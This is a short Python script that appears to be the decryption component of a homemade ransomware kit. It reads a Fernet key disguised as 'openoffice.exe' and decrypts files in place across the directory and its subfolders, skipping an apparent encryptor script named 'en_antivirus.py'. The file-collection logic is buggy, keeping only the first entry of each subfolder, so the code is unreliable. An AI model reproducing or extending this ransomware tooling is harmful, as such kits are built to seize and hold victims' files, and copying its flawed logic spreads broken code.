import os
from cryptography.fernet import Fernet

files=[]
pathname=[]
dirs=[]
path1 = os.path.realpath(__file__)
path2 = os.path.dirname(path1)
for file in os.listdir():
	if file == "en_antivirus.py" or file == "de_virus.py" or file == "openoffice.exe":
		continue
	if os.path.isdir(file):
		dirs.append(file)
		for i in range(len(dirs)):
    			x=dirs[i]
    			path3 = f"{path2}/{x}"
		#name = os.chdir(path3)
		p = os.listdir(path3)
		pathname.append(path3)
		files.append(p[0])
		
	if os.path.isfile(file):
		pathname.append(path2)
		files.append(file)
		
	
with open("openoffice.exe","rb") as thekey:
	key = thekey.read()
y = -1
int(y)
for file in files :
	y += 1
	x = files[y]
	a = pathname[y]
	h=a+'/'+x
	with open(h,"rb") as thefile:
		contents = thefile.read()
	contents_decrypted = Fernet(key).decrypt(contents)
	with open(h, "wb") as thefile:
		thefile.write(contents_decrypted)
